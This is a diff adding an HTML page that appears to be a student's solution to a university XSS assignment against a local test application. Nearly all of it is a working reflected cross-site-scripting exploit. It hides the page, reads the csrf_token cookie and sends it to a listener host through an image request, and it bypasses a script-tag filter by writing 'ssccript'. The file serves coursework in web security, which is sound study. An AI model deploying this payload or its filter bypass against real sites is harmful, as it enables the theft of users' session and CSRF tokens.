@@ -1,0 +1,78 @@
+<!-- 
+    List of people I discussed the project with: Yuchan Kim, Seungwon Burm
+
+    List of references used:
+    1. https://owasp.org/www-community/attacks/xss/
+    2. https://portswigger.net/web-security/cross-site-scripting
+    3. https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md
+    4. https://developer.mozilla.org/en-US/docs/Web/API/History/pushState
+    5. https://zapier.com/blog/inspect-element-tutorial/
+    6. Lecture 5: XSS, CSRF slide from Piazza under section Lectures
+-->
+<html>
+    <head>
+        <meta charset="utf-8">
+        <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+        <script>
+            
+            
+            function payload(adversary) {
+                function proxy(href) {
+                    $("html").load(href, function() {
+                        var cookieArray = document.cookie.split("; ");
+				        var cookieVal = "";
+				        for (var x = 0; x < cookieArray.length; x++){
+					    var token = cookieArray[x].split("=");
+					        if(token[0].startsWith("csrf_token")){
+						        cookieVal = token[1];
+					        }
+				        }
+
+                        var sendTokenToServer=new Image;
+                        sendTokenToServer.src="http://localhost:31337?"+cookieVal;
+                        
+                        
+
+                        $("html").show();
+                        $("#query-lbl").hide();
+                        $('a[href*="search?q=%3C"]').hide();
+                        
+                        
+                    });
+                }
+                history.pushState({},"","./search"); // add stuff between (), https://developer.mozilla.org/en-US/docs/Web/API/History/pushState
+                $("html").hide();
+                
+                proxy("./" + document.cookie); // add something after ./ 
+                //think about what web page you want to load (where is the XSS vulnerability?)
+            }
+
+            function makeLink(xssdefense, target, adversary) {
+                if (xssdefense == 0) {
+                    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() +
+                        ";payload(\"" + adversary + "\");</script" + ">");
+                } else {
+                    if (xssdefense == 1) {
+                    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<ssccript" + ">" + payload.toString() +
+                        ";payload(\"" + adversary + "\");</ssccript" + ">");
+                    }
+                }
+            }
+
+            var xssdefense = 1;
+            var target = "http://localhost/project2/";
+            var adversary = "http://localhost:31337/";
+
+            $(function() {
+                var url = makeLink(xssdefense, target, adversary);
+                $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+            });
+        </script>
+
+    </head>
+    <body class="vsc-initialized">
+        <h3></h3>
+    </body>
+</html>
+
